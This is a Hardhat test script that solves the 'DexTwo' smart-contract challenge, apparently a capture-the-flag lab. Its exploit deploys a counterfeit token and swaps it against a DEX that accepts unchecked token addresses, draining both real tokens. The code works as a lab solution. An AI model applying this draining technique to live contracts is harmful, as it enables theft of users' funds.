const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] DexTwo', function () {

    let deployer, attacker;
    
    before(async () =>{
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        const network = await ethers.provider.getNetwork();
        const chainID = network.chainId
        
        if (chainID == 5){ // goerli testnet
            /** connect to Dapp in goerli **/
            [attacker] = await ethers.getSigners();
            const DexFactory = await ethers.getContractFactory('DexTwo');
            const SwappableTokenFactory = await ethers.getContractFactory('SwappableTokenTwo');
            this.target = DexFactory.attach("");
            this.token1 = SwappableTokenFactory.attach(await this.target.token1());
            this.token2 = SwappableTokenFactory.attach(await this.target.token2());
        } else { // local network - hardhat  
            /** local test **/
            [deployer, attacker] = await ethers.getSigners();
            const DexFactory = await ethers.getContractFactory('DexTwo', deployer);
            const SwappableTokenFactory = await ethers.getContractFactory('SwappableTokenTwo', deployer);
            this.target = await DexFactory.deploy();
            this.token1 = await SwappableTokenFactory.deploy(this.target.address, "Token 1", "TKN1", 110); // 100 for dex, 10 for attacker
            this.token2 = await SwappableTokenFactory.deploy(this.target.address, "Token 2", "TKN2", 110); // 100 for dex, 10 for attacker
            /** set token for dex contract **/
            let setokenTX = await this.target.connect(deployer).setTokens(this.token1.address, this.token2.address); await setokenTX.wait();
            /** send tokens to dex **/
            let approveTX = await this.target.connect(deployer).approve(this.target.address, 100); await approveTX.wait();
            let addToken1TX = await this.target.connect(deployer).add_liquidity(this.token1.address, 100); await addToken1TX.wait();
            let addToken2TX = await this.target.connect(deployer).add_liquidity(this.token2.address, 100); await addToken2TX.wait();
            /** send tokens to attacker **/
            let sendToken1TX = await this.token1.connect(deployer).transfer(attacker.address, 10); await sendToken1TX.wait();
            let sendToken2TX = await this.token2.connect(deployer).transfer(attacker.address, 10); await sendToken2TX.wait();
        }
    });

    it('Exploit', async () => {
        /** CODE YOUR EXPLOIT HERE */
        const EvilSwappableTokenFactory = await ethers.getContractFactory('EvilSwappableTokenTwo', attacker);
        let Token3vil = await EvilSwappableTokenFactory.deploy(this.target.address, "Token 3vil", "TKN3", 100000000);
        const DexTwoTokenApproverFactory = await ethers.getContractFactory('DexTwoTokenApprover', attacker);
        let DexTwoTokenApprover = await DexTwoTokenApproverFactory.deploy();
        let tokenMap = {"Token1": this.token1, "Token2": this.token2};
        for (const tokenName in tokenMap ) {
            //Burn to reset
            Token3vil.burnAllFrom(this.target.address);
            /** Drain tokenMap[tokenName] from DEX **/
            console.log(`  Drain ${tokenName} from DEX`);
            let tokenAttacker = parseInt(await tokenMap[tokenName].balanceOf(attacker.address));
            let tokenDex = parseInt(await tokenMap[tokenName].balanceOf(this.target.address));
            console.log(`\t ${tokenName} balance[attacker]: ${tokenAttacker}`);
            console.log(`\t ${tokenName} balance[dex]     : ${tokenDex}`);
            let x1 = parseInt(tokenDex/tokenAttacker);
            let accumToken = x1*tokenDex;
            console.log(`\t DEX has ${x1} times amount of ${tokenName} to attacker`);
            console.log(`\t Transferring ${accumToken} tokens of Token3vil to DEX (for having ${x1}:1 swap rate with ${tokenName})...`);
            let tarnsferTokenTX = await Token3vil.connect(attacker).transfer(this.target.address, accumToken); await tarnsferTokenTX.wait();
            console.log(`\t Token3 balance[attacker]: ${await Token3vil.balanceOf(attacker.address)}`);
            console.log(`\t Token3 balance[dex]     : ${await Token3vil.balanceOf(this.target.address)}`);
            console.log(`\t Approving ${accumToken} tokens of Token3vil for DEX...`);
            let approveTokenTX = await DexTwoTokenApprover.connect(attacker).approve(Token3vil.address, this.target.address, accumToken); 
            await approveTokenTX.wait();
            console.log(`\t Draining ${tokenName} from DEX...`);
            let draintoken1TX = await this.target.connect(attacker).swap(
                Token3vil.address, 
                tokenMap[tokenName].address, 
                accumToken
            ); await draintoken1TX.wait();
            console.log(`\t ${tokenName} balance[attacker]: ${await tokenMap[tokenName].balanceOf(attacker.address)}`);
            console.log(`\t ${tokenName} balance[dex]     : ${await tokenMap[tokenName].balanceOf(this.target.address)}`);
        }
    }).timeout(0);

    after(async () => {
        /** SUCCESS CONDITIONS */
        expect(0).to.be.eq(parseInt(await this.token1.balanceOf(this.target.address)));
        expect(0).to.be.eq(parseInt(await this.token2.balanceOf(this.target.address)));
    });
});